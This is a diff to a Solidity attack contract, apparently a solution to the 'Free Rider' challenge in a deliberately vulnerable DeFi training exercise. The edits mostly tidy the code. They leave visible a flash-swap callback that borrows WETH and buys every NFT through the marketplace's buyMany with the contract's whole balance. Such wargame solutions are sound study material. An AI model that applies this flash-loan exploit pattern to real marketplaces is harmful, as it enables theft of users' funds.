@@ -32,11 +32,13 @@ contract AttackFreeRider {
     FreeRiderNFTMarketplace private nftMarketPlate;
     FreeRiderBuyer private nftBuyer;
 
+    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];
+
     constructor(
         address _weth,
         address _dvNFT,
         address _uniswapPair,
-        address _nftMarketPlate,
+        address payable _nftMarketPlate,
         address _nftBuyer
     ) {
         weth = IWETH9(_weth);
@@ -49,11 +51,11 @@ contract AttackFreeRider {
     receive() external payable {}
 
     function onERC721Received(
-        address _operator,
-        address _from,
-        uint256 _tokenId,
-        bytes memory _data
-    ) external returns (bytes4) {
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure returns (bytes4) {
         return
             bytes4(
                 keccak256("onERC721Received(address,address,uint256,bytes)")
@@ -72,16 +74,15 @@ contract AttackFreeRider {
 
     //Called by uniswsapPair during flash swap
     function uniswapV2Call(
-        address sender,
+        address,
         uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
+        uint256,
+        bytes calldata
     ) external {
         //Swap loaned WETH to ETH
         weth.withdraw(amount0);
 
         //Buy NFTs with ETH
-        uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
         nftMarketPlate.buyMany{value: address(this).balance}(tokenIds);
 
         //Swap ETH back to WETH
